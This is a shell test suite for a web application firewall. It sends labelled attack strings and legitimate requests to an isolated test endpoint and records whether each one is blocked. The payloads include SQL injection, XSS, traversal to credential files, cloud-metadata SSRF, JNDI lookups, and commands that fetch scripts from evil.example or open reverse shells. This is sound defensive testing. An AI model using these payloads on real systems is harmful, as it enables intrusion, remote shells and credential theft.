#!/bin/sh
# Origin: ExampleCo WAF test suite (example-infra/load-tests/waf/attacks.sh), by the same author,
# relicensed here under the Apache License 2.0 as part of Aegolith (see LICENSE at the repository root).
# Copied verbatim except for scrubbing: internal hostnames, a brand e-mail domain, a personal e-mail local part and a
# phone number were replaced with example values. The request shapes and payloads are unchanged.
# Aegolith additions (not in the original suite) are marked "Aegolith:" below.
# Aegolith does not run this script against a server: testdata/corpus/gen.sh sources it with the request helpers
# redefined so that each case becomes one JSON line in attacks.jsonl or legit.jsonl.
# Coraza/OWASP CRS attack + false-positive suite. Runs INSIDE the `client` pod of coraza-test-stack.yaml (busybox sh + curl).
# Every request goes to the isolated test Traefik, whose backend is an echo server: nothing reaches the real API.
# Output, one line per case:  RESULT|kind|category|location|name|plain_status|waf_status
#   kind=attack: PASS when the WAF route returns 403 (blocked).   kind=legit: PASS when it is NOT 403.
# Usage: kubectl -n waf-test exec -i client -- sh -s < load-tests/waf/attacks.sh
B="${B:-http://waf-test.example}"
W="${W:-/waf}"   # WAF route prefix: /waf (CRS defaults, PL1) or /waf2 (tuned, PL2)
# Base URLs. Defaults = the in-cluster test stack. For an external WAF (e.g. Azure Front Door) set both, pointing at a
# path that does NOT exist on the real backend, so a request the WAF lets through only reaches the router's 404:
#   PLAIN=https://origin.example.com/waf-probe WAFB=https://<frontdoor-host>/waf-probe sh attacks.sh
# (with an external WAF, "plain" shows the origin's answer: 404 = reached the router, which is expected).
PLAIN="${PLAIN:-$B/plain}"
WAFB="${WAFB:-$B$W}"
API="/api/v1/products"

# A FAKE token shaped like the app's JWTs (header.payload.signature), built at runtime so no JWT-looking literal
# sits in git (gitleaks). It is not signed by anything and authenticates nowhere.
b64url() { printf '%s' "$1" | base64 | tr -d '=\n' | tr '/+' '_-'; }
FAKE_JWT="$(b64url '{"alg":"RS256","typ":"JWT"}').$(b64url '{"sub":"waf-test","role":"customer"}').$(b64url 'not-a-real-signature')"

code() { curl -s -o /dev/null -m 10 -w '%{http_code}' "$@"; }

emit() { # kind category location name plain waf
  if [ "$1" = attack ]; then [ "$6" = 403 ] && r=PASS || r=FAIL; else [ "$6" = 403 ] && r=FAIL || r=PASS; fi
  echo "$r|$1|$2|$3|$4|$5|$6"
}

# --- request shapes ------------------------------------------------------------------------------------------
q()    { emit "$1" "$2" query  "$3" "$(code -G --data-urlencode "q=$4" "$PLAIN$API/search")" "$(code -G --data-urlencode "q=$4" "$WAFB$API/search")"; }
path() { emit "$1" "$2" path   "$3" "$(code --path-as-is "$PLAIN$4")" "$(code --path-as-is "$WAFB$4")"; }
hdr()  { emit "$1" "$2" header "$3" "$(code -H "$4: $5" "$PLAIN$API")" "$(code -H "$4: $5" "$WAFB$API")"; }
json() { emit "$1" "$2" json   "$3" "$(code -X "${5:-POST}" -H 'Content-Type: application/json' --data-raw "$4" "$PLAIN/api/v1/cart/items")" \
                                     "$(code -X "${5:-POST}" -H 'Content-Type: application/json' --data-raw "$4" "$WAFB/api/v1/cart/items")"; }
form() { emit "$1" "$2" form   "$3" "$(code --data-urlencode "$4" "$PLAIN/api/v1/auth/login")" "$(code --data-urlencode "$4" "$WAFB/api/v1/auth/login")"; }
xml()  { emit "$1" "$2" xml    "$3" "$(code -H 'Content-Type: application/xml' --data-raw "$4" "$PLAIN/api/v1/import")" \
                                     "$(code -H 'Content-Type: application/xml' --data-raw "$4" "$WAFB/api/v1/import")"; }
meth() { emit "$1" "$2" method "$3" "$(code -X "$4" "$PLAIN$API")" "$(code -X "$4" "$WAFB$API")"; }

A=attack
# --- 1. SQL injection ----------------------------------------------------------------------------------------
q $A sqli "classic tautology"          "1' OR '1'='1"
q $A sqli "tautology with comment"     "admin'--"
q $A sqli "numeric tautology"          "1 OR 1=1"
q $A sqli "union select"               "1 UNION SELECT username, password FROM users--"
q $A sqli "union all null padding"     "' UNION ALL SELECT NULL,NULL,NULL--"
q $A sqli "stacked drop table"         "1; DROP TABLE orders;--"
q $A sqli "time-based pg_sleep"        "1' AND (SELECT 1 FROM pg_sleep(5))--"
q $A sqli "time-based sleep mysql"     "1' AND SLEEP(5)#"
q $A sqli "boolean blind substring"    "1' AND SUBSTRING(version(),1,1)='P"
q $A sqli "error-based cast"           "1' AND 1=CAST((SELECT version()) AS int)--"
q $A sqli "inline comment evasion"     "1'/**/UNION/**/SELECT/**/1,2--"
q $A sqli "case mixing evasion"        "1' uNiOn SeLeCt 1,2--"
q $A sqli "information_schema"         "' UNION SELECT table_name FROM information_schema.tables--"
q $A sqli "pg catalog"                 "' UNION SELECT usename FROM pg_user--"
q $A sqli "hex encoded string"         "1 UNION SELECT 0x61646d696e"
q $A sqli "having/group by probe"      "1' GROUP BY 1 HAVING 1=1--"
q $A sqli "order by column probe"      "1' ORDER BY 10--"
q $A sqli "copy to program (pg rce)"   "'; COPY (SELECT '') TO PROGRAM 'id'--"
path $A sqli "sqli in path"            "/api/v1/products/1%27%20OR%20%271%27=%271"
json $A sqli "sqli in json value"      '{"product_id":"1'"'"' OR '"'"'1'"'"'='"'"'1","qty":1}'
json $A sqli "sqli union in json"      '{"search":"x'"'"' UNION SELECT password FROM users--"}'
form $A sqli "sqli in login form"      "email=admin@example.in' OR 1=1--"
hdr $A sqli "sqli in cookie"           Cookie "session=1' OR '1'='1"
hdr $A sqli "sqli in user-agent"       User-Agent "Mozilla' UNION SELECT 1--"
hdr $A sqli "sqli in referer"          Referer "https://x.com/?id=1' OR '1'='1"
# Aegolith: quote-free SQL injection after leading words, in an unknown path, and after long padding (G1).
q $A sqli "union after leading words"  "please send 1 UNION SELECT password FROM users--"
q $A sqli "stacked drop after a word"  "milk 1; DROP TABLE orders;--"
json $A sqli "union after words in json" '{"search":"b b b b b b 1 UNION SELECT password FROM users--"}'
path $A sqli "union in unknown path"   "/api/v1/probe/1%20UNION%20SELECT%20username,%20password%20FROM%20users--"
PAD="$(printf '%020000d' 0 | tr 0 a)"
json $A sqli "union after json padding" '{"search":"'"$PAD"' 1 UNION SELECT password FROM users--"}'
# Aegolith: counter-cases for the percent and bare-number guards: modulo before a subquery or a like, a percent or a range before a tautology, plain integers ored (alpha.6).
q $A sqli "modulo before a subquery"   "5 % (select 1)"
q $A sqli "percent then tautology"     "80% cotton or 1=1"
q $A sqli "range then tautology"       "6-7 or 8=8"
q $A sqli "integers ored together"     "99 or 1 or 1"
q $A sqli "modulo then like"           "1%(1) or 1 like 1"

# --- 2. Cross-site scripting -----------------------------------------------------------------------------------
q $A xss "script tag"                  "<script>alert(1)</script>"
q $A xss "img onerror"                 "<img src=x onerror=alert(1)>"
q $A xss "svg onload"                  "<svg/onload=alert(document.cookie)>"
q $A xss "javascript uri"              "javascript:alert(1)"
# Aegolith: script tag nested in a broken one (G2).
q $A xss "nested broken script tag"    "<scr<script>ipt>alert(1)</script>"
q $A xss "iframe srcdoc"               "<iframe srcdoc='<script>alert(1)</script>'>"
q $A xss "body onload"                 "<body onload=alert(1)>"
q $A xss "event handler no tag"        "\" onmouseover=\"alert(1)"
q $A xss "data uri html"               "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
q $A xss "case and whitespace evasion" "<ScRiPt >alert(1)</sCrIpT >"
q $A xss "html entity evasion"         "<a href=\"&#106;avascript:alert(1)\">x</a>"
q $A xss "document.cookie exfil"       "<script>fetch('//evil.example/'+document.cookie)</script>"
q $A xss "template literal"            "<script>alert\`1\`</script>"
json $A xss "stored xss in review"     '{"review":"<script>alert(1)</script>","rating":5}'
json $A xss "xss in address field"     '{"address_line1":"<img src=x onerror=alert(1)>"}'
hdr $A xss "xss in referer"            Referer "<script>alert(1)</script>"
hdr $A xss "xss in user-agent"         User-Agent "<svg onload=alert(1)>"

# --- 3. Path traversal / local file inclusion -------------------------------------------------------------------
path $A lfi "dot-dot-slash passwd"     "/api/v1/files/../../../../etc/passwd"
path $A lfi "url-encoded traversal"    "/api/v1/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
path $A lfi "double-encoded traversal" "/api/v1/files/%252e%252e%252f%252e%252e%252fetc%252fpasswd"
path $A lfi "backslash traversal"      "/api/v1/files/..%5c..%5c..%5cwindows%5cwin.ini"
path $A lfi "proc self environ"        "/api/v1/files/../../proc/self/environ"
q $A lfi "traversal in query"          "../../../../etc/shadow"
q $A lfi "null byte"                   "../../etc/passwd%00.png"
q $A lfi "k8s service account token"   "../../../var/run/secrets/kubernetes.io/serviceaccount/token"
path $A lfi ".env file"                "/.env"
path $A lfi ".git config"              "/.git/config"
path $A lfi "backup file"              "/config.php.bak"

# --- 4. Remote file inclusion ----------------------------------------------------------------------------------
q $A rfi "http include"                "http://evil.example/shell.txt?"
q $A rfi "php wrapper"                 "php://filter/convert.base64-encode/resource=index.php"
q $A rfi "file wrapper"                "file:///etc/passwd"

# --- 5. OS command injection -----------------------------------------------------------------------------------
q $A cmdi "semicolon id"               "; id"
q $A cmdi "pipe cat passwd"            "| cat /etc/passwd"
q $A cmdi "backticks"                  "\`whoami\`"
q $A cmdi "dollar subshell"            "\$(curl http://evil.example/x.sh | sh)"
q $A cmdi "and-and wget"               "&& wget http://evil.example/m -O /tmp/m"
q $A cmdi "reverse shell"              "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
q $A cmdi "nc listener"                "; nc -e /bin/sh 10.0.0.1 4444"
q $A cmdi "windows cmd"                "& type C:\\Windows\\win.ini"
q $A cmdi "powershell"                 "; powershell -enc SQBFAFgA"
json $A cmdi "cmdi in json"            '{"phone":"9999999999; cat /etc/passwd"}'
hdr $A cmdi "shellshock user-agent"    User-Agent "() { :; }; /bin/bash -c 'cat /etc/passwd'"
# Aegolith: an encoded line break before a bare command, sleep, and quote- or backslash-split command words (G4).
path $A cmdi "encoded newline id"      "/api/v1/products/search?q=x%0aid"
q $A cmdi "sleep after semicolon"      "; sleep 10"
# Aegolith: sleep after a pipe, after "&&", and glued to a prefix with no blank (alpha.5).
q $A cmdi "sleep between pipes"        "x| sleep 10 |"
q $A cmdi "sleep after and-and"        "a && sleep 10"
q $A cmdi "sleep glued to prefix"      "1;sleep 5"
q $A cmdi "sleep after an address"     "127.0.0.1; sleep 5"
q $A cmdi "quote-split whoami"         ";w'h'o'am'i"
q $A cmdi "backslash-split cat"        ";c\\at /et\\c/pas\\swd"
# Aegolith: counter-cases for the UA comment, dashed-word, prose backtick and prose line guards; sleep after a one-letter probe prefix (alpha.6).
hdr $A cmdi "flagged command in a user-agent comment" User-Agent "Mozilla/5.0 (Linux; id -u)"
json $A cmdi "dashed word before a system path" '{"note":"Tea & cat -cozy /etc/passwd"}'
json $A cmdi "backticks after a semicolon"     '{"note":"x; `id`"}'
q $A cmdi "inline code in a query value"       "Use \`ls\` to list files"
path $A cmdi "encoded newline after a token"   "/api/v1/products/search?q=a%0d%0aid"
q $A cmdi "sleep after a one-letter prefix"    "x; sleep 10"

# --- 6. Server-side template injection -------------------------------------------------------------------------
q $A ssti "jinja config"               "{{config.items()}}"
q $A ssti "jinja rce"                  "{{''.__class__.__mro__[1].__subclasses__()}}"
q $A ssti "java el"                    "\${T(java.lang.Runtime).getRuntime().exec('id')}"
q $A ssti "go template"                "{{ .Env }}"
# Aegolith: Go template actions and EL expressions (G3).
q $A ssti "go printf action"           "{{printf \"%v\" .}}"
q $A ssti "go call action"             "{{ call .Func }}"
q $A ssti "go define action"           "{{define \"x\"}}{{.}}{{end}}"
q $A ssti "el arithmetic"              "\${7*7}"
q $A ssti "el member access"           "\${user.password}"

# --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
hdr $A log4shell "obfuscated jndi"     X-Api-Version "\${\${lower:j}ndi:\${lower:l}dap://evil.example/a}"
q $A log4shell "jndi in query"         "\${jndi:rmi://evil.example/x}"
json $A log4shell "jndi in json"       '{"name":"${jndi:dns://evil.example/a}"}'

# --- 8. Server-side request forgery ----------------------------------------------------------------------------
q $A ssrf "azure imds"                 "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
q $A ssrf "aws imds"                   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
q $A ssrf "gopher redis"               "gopher://127.0.0.1:6379/_FLUSHALL"
q $A ssrf "localhost admin"            "http://127.0.0.1:8080/admin"
json $A ssrf "ssrf in image url"       '{"image_url":"http://169.254.169.254/metadata/identity/oauth2/token"}'

# --- 9. XML external entity ------------------------------------------------------------------------------------
xml $A xxe "file entity"               '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
xml $A xxe "remote dtd"                '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://evil.example/evil.dtd"><r/>'
xml $A xxe "billion laughs"            '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;">]><l>&c;</l>'

# --- 10. NoSQL / JSON operator injection -----------------------------------------------------------------------
json $A nosqli "mongo gt operator"     '{"email":{"$gt":""},"password":{"$gt":""}}'
json $A nosqli "mongo where js"        '{"$where":"sleep(5000)"}'
q $A nosqli "operator in query"        "[\$ne]=1"

# --- 11. PHP / code injection ----------------------------------------------------------------------------------
q $A codei "php tag"                   "<?php system(\$_GET['c']); ?>"
q $A codei "php eval"                  "eval(base64_decode('cGhwaW5mbygpOw=='))"
q $A codei "node child_process"        "require('child_process').exec('id')"
json $A codei "prototype pollution"    '{"__proto__":{"isAdmin":true}}'
# Aegolith: injection and prototype pollution in key names (G7).
json $A sqli "sqli in json key"        '{"1'"'"' OR '"'"'1'"'"'='"'"'1":1}'
path $A sqli "sqli in query key"       "/api/v1/products/search?1'%20OR%20'1'%3D'1=x"
path $A codei "proto bracket query key" "/api/v1/products/search?__proto__[isAdmin]=true"
path $A codei "constructor dot query key" "/api/v1/products/search?a.constructor.prototype.isAdmin=true"
q $A codei "java deserialization b64"  "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="
# Aegolith: a base64 Java serialized object as a segment of an unknown path (G1b).
path $A codei "java deserialization b64 in unknown path" "/api/v1/probe/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA=="

# --- 12. HTTP protocol attacks ---------------------------------------------------------------------------------
q $A protocol "crlf header injection"  "x%0d%0aSet-Cookie:%20admin=true"
path $A protocol "crlf in path"        "/api/v1/products%0d%0aX-Injected:%201"
hdr $A protocol "request smuggling te" Transfer-Encoding "chunked, identity"
meth $A protocol "TRACE method"        TRACE
meth $A protocol "TRACK method"        TRACK
meth $A protocol "made-up method"      FOOBAR
hdr $A protocol "content-type abuse"   Content-Type "application/x-evil-type"

# --- 13. Scanners and bad bots ---------------------------------------------------------------------------------
hdr $A scanner "sqlmap"                User-Agent "sqlmap/1.8.4#stable (https://sqlmap.org)"
hdr $A scanner "nikto"                 User-Agent "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
hdr $A scanner "nuclei"                User-Agent "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
hdr $A scanner "masscan"               User-Agent "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
path $A scanner "wp-admin probe"       "/wp-admin/admin-ajax.php"
path $A scanner "phpmyadmin probe"     "/phpmyadmin/index.php"
path $A scanner "actuator probe"       "/actuator/env"

# Aegolith: scanner probe paths under an API prefix and fuzzer user agents (G5, G6).
path $A scanner "dotenv under prefix"  "/api/v1/.env"
path $A scanner "git config under prefix" "/api/v1/.git/config"
path $A scanner "actuator under prefix" "/api/v1/actuator/env"
hdr $A scanner "wfuzz"                 User-Agent "Wfuzz/3.1.0"
hdr $A scanner "feroxbuster"           User-Agent "feroxbuster/2.10.4"
hdr $A scanner "hydra"                 User-Agent "Hydra"

# --- 14. Session fixation / misc ----------------------------------------------------------------------------------
q $A session "session fixation"        "PHPSESSID=attacker-fixed-id"
q $A misc "ldap injection"             "*)(uid=*))(|(uid=*"
q $A misc "xpath injection"            "' or name()='username' or 'x'='y"

# --- 15. False positives: real ExampleCo traffic that must NOT be blocked ------------------------------------------
L=legit
q $L fp "plain search"                 "milk"
q $L fp "search with ampersand"        "milk & bread"
q $L fp "search with apostrophe"       "kid's snacks"
q $L fp "name with apostrophe"         "O'Brien"
q $L fp "urdu text"                    "دودھ اور روٹی"
q $L fp "hindi text"                   "दूध और ब्रेड"
q $L fp "kashmiri item"                "noon chai 250g"
q $L fp "price range"                  "price<500"
q $L fp "percent discount"             "50% off"
q $L fp "phone number"                 "+91 9000012345"
q $L fp "email address"                "customer.test+orders@example.com"
q $L fp "address with hash"            "House #12, Lal Chowk, Srinagar 190001"
q $L fp "select as plain word"         "select fresh vegetables"
q $L fp "union as plain word"          "union bank atm near me"
q $L fp "drop as plain word"           "drop off at gate 2"
q $L fp "script as plain word"         "movie script book"
json $L fp "add to cart"               '{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2}'
json $L fp "checkout with note"        '{"payment_method":"cod","note":"Please ring the bell, don'"'"'t knock. Gate code 1234 & leave at door"}'
json $L fp "review with emoji"         '{"review":"Fresh & tasty 😋 – 5/5! Will order again :)","rating":5}'
json $L fp "address json"              '{"line1":"Flat 3B, Rajbagh","city":"Srinagar","pincode":"190008","landmark":"Near J&K Bank"}'
json $L fp "vendor product create"     '{"name":"Basmati Rice (5 kg)","price":549.0,"description":"Long-grain; aged 2 years. Best for biryani/pulao."}'
json $L fp "update via PATCH"          '{"qty":3}' PATCH
json $L fp "replace via PUT"           '{"line1":"New address"}' PUT
meth $L fp "DELETE cart item"          DELETE
meth $L fp "OPTIONS preflight"         OPTIONS
form $L fp "login form"                "email=customer@example.com"
hdr $L fp "bearer jwt"                 Authorization "Bearer $FAKE_JWT"
hdr $L fp "android user-agent"         User-Agent "okhttp/4.12.0"
hdr $L fp "ios user-agent"             User-Agent "ExampleCo/1.4.2 (iPhone; iOS 18.1; Scale/3.00)"
hdr $L fp "browser user-agent"         User-Agent "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36"
path $L fp "uuid path"                 "/api/v1/orders/4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b"
path $L fp "nested path with query"    "/api/v1/vendors/12/products?page=2&limit=20&sort=-created_at"
